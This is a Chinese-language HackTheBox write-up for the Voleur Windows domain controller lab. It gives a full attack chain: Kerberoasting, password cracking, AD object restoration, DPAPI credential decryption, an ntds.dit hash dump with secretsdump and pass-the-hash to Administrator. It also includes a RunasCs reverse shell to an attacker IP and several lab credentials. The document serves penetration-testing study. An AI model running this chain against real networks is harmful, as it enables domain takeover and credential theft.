---
title: HTB-Voleur WriteUp
published: 2025-09-07
description: HackTheBox Voleur 通关记录。
image: http://imgur.41an.com/picgo/2025-09/htb-voleur-1757266847498.png
tags:
  - Penetration
  - PrivEsc
  - Windwos
category: 打靶日记
draft: false
lang: zh_CN
---
## 1. Recon
`nmap` 半连接快速扫一下端口服务
```shell
nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v 10.10.11.76
...
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2222/tcp open  EtherNetIP-1
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```
再详细扫一下上一步获取到的端口
```shell
nmap -sT -sVC -Pn -p53,88,135,139,389,445,464,593,636,2222,3268,3269,5985 10.10.11.76
...
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-07 16:49:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
...
```
将域名加入 `hosts` 文件解析
```shell
echo "10.10.11.76 voleur.htb dc.voleur.htb" >> /etc/hosts
```
同步时钟
```shell
ntpdate 10.10.11.76
```
配置 `/etc/krb5.conf`
```text
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  VOLEUR.HTB = {
    kdc = dc.voleur.htb
    admin_server = dc.voleur.htb
  }
```
## 2. Foothold
依据题目给出的凭据 `ryan.naylor/HollowOct31Nyt`，探测一下目标服务器所支持的登录协议

![htb-voleur-nxc.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-nxc-1757262328005.png)

翻找 `ryan.naylor` 用户的 `SMB` 共享
```shell
impacket-getTGT 'VOLEUR.HTB/ryan.naylor':'HollowOct31Nyt'       
export KRB5CCNAME=ryan.naylor.ccache
impacket-smbclient -k -no-pass VOLEUR.HTB/ryan.naylor@dc.voleur.htb
```
下载 `IT` 目录的 `Access_Review.xlsx` 

![htb-voleur-ryan-smb.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-ryan-smb-1757262541144.png)

打开 `Access_Review.xlsx` 需要口令

<p align="center">
  <img src="http://imgur.41an.com/picgo/2025-09/htb-voleur-xlsx-pwd-1757262651648.png" width="50%">
</p>

将该文件的 hash 提取出来爆破

![htb-voleur-hash.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-hash-1757262744446.png)

> Notes : 需要将前缀  `Access_Review.xlsx:` 删除，剩下的才是hash

```shell
# hashcat -m 9600 hash.txt /usr/share/wordlists/rockyou.txt
...
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1
```

翻查 `Access_Review.xlsx`

![htb-voleur-xlsx.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-xlsx-1757262811157.png)

 获得三组凭证
```
 Todd.Wolfe/NightT1meP1dg3on14
 svc_ldap/M1XyC9pW7qT5Vn
 svc_iis/N5pXyW1VqM7CZ8
```

其中仅有 `svc_ldap` 可用，用 `svc_ldap` 跑一下 `bloodhound`
```shell
bloodhound-python -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d voleur.htb -ns 10.10.11.76 -c All --zip
```
可见 `svc_ldap` 具有对 `svc_winrm` 用户 `WriteSPN` 的权限

![htb-voleur-svc_ldap-bh.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-svc_ldap-bh-1757262863684.png)
使用 [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) 枚举所有可以被 `svc_ldap` 修改 `SPN` 权限的用户，并返回其 `hash`
```shell
impacket-getTGT 'voleur.htb/svc_ldap':'M1XyC9pW7qT5Vn'             
export KRB5CCNAME=svc_ldap.ccache   
python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
```
获取到 `lacey.miler` 和 `svc_winrm` 的 `hash`
![htb-voleur-kerberoast.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-kerberoast-1757262937270.png)

`hashcat` 爆破获取到 `svc_winrm` 的凭证
```shell
hashcat -m 13100 -a 0 hash.txt /path/to/rockyou.txt
```
成功登录
```shell
impacket-getTGT 'voleur.htb/svc_winrm':'AFireInsidedeOzarctica980219afi'
export KRB5CCANME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```  
## 3. PrivEsc
通过 `winPEASx64` 、`证书缺陷漏洞` 等操作都没发现什么有价值的信息

翻看之前已获取到的信息，发现有个恢复用户的组 `RESTORE_USERS@VOLEUR.HTB`，结合 ` Access_Review.xlsx ` 里备注提及到的删除用户操作
![htb-voleur-restore_users.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-restore_users-1757263006632.png)

刚好有 `restore_users` 组中的用户 `svc_ldap` 的凭证
![htb-voleur-restore_users-2.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-restore_users-1757263067356.png)

恢复之前表格里提及到被删除的 `Todd.Wolfe` 用户

**方法一：**
直接使用 **新版** `bloodyAD` 的 `restore` 功能
```shell
bloodyAD --host dc.voleur.htb -d voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k set restore 'todd.wolfe'  
[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```

**方法二：**
1. 上传 `RunasCs.exe` 反弹 `svc_ldap` 用户的 `shell`
```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload /home/kali/Voleur/RunasCs.exe
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>  .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.16.48:6666
```
2. 查询删除的用户
```shell
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
```
3. 恢复删除的用户
```
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
```

获得 `Todd.Wolfe` 用户的凭据后继续翻找 `SMB` 
```shell
impacket-getTGT 'VOLEUR.HTB/Todd.Wolfe':'NightT1meP1dg3on14'
export KRB5CCNAME=todd.wolfe.ccache
impacket-smbclient -k -no-pass VOLEUR.HTB/todd.wolfe@dc.voleur.htb
```

发现使用 `DPAPI` 的迹象

![htb-voleur-dpapi.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-dpapi-1757266697586.png)

下载 `DPAPI` 主密钥和加密凭证
```
# use IT

# cd /Second-Line Support /Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/
# get 772275FAD58525253490A9B0039791D3

# cd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```
解密 `masterkey`
```shell
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110                                      
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```
解密 `Credential Blob`，得到 `jeremy.combs` 口令
```shell
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```
继续翻找 `SMB`
```shell
impacket-getTGT 'VOLEUR.HTB/jeremy.combs':'qT3V9pLXyN7W4m'
export KRB5CCNAME=jeremy.combs.ccache
impacket-smbclient -k -no-pass VOLEUR.HTB/jeremy.combs@dc.voleur.htb
```

发现 `id.rsa` 和 `Notes.txt.txt` ，下载至本地

![htb-voleur-jeremy-smb.png](http://imgur.41an.com/picgo/2025-09/htb-voleur-jeremy-smb-1757264419904.png)
从 `Note.txt.txt` 中得知目标系统还运行了 `WSL` 
```shell        
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```
`ssh-keygen` 导出公钥或者 ` base64 ` 解码可以看到是 ` svc_backup ` 用户的秘钥
```shell
ssh-keygen -y -f ./id_rsa 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC
```
通过前期端口扫描收集到的 `2222` 端口登录
```shell
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```
在挂载的 `c` 盘中发现了 AD 数据库的备份，将其传回本地
```shell
scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" ./
scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" ./
```
使用 `SYSTEM` 中的 `BootKey` 本地提取 `AD数据库` 所有的 `NTLM hash`
```shell
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
...
```
登录 `Administrator`
```shell
impacket-getTGT 'VOLEUR.HTB/Administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2'
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```
> Notes : `LM hash` 与 `NT Hash` 是同一口令依据不同算法输出的结果，之所以需要传入两种 `hash` 是因为认证协议里的结构需要携带 `LM Hash` 和 `NTLM Hash` 两个字段</br>
> 禁用时，LM Hash 永远是固定的哑值：`aad3b435b51404eeaad3b435b51404ee`
